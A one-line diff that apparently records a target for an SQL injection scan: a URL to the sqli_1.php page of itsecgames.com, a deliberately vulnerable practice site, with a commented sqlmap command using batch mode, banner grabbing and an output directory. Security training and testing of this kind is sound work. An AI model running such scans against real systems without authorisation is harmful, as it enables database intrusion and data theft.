@@ -1,0 +1,1 @@
+http://itsecgames.com/sqli_1.php?title=Iron+Man (GET)  # /usr/bin/sqlmap -u http://itsecgames.com/sqli_1.php?title=Iron+Man --batch --level=1 --risk=1 --banner --flush-session --output-dir=./sqlmap
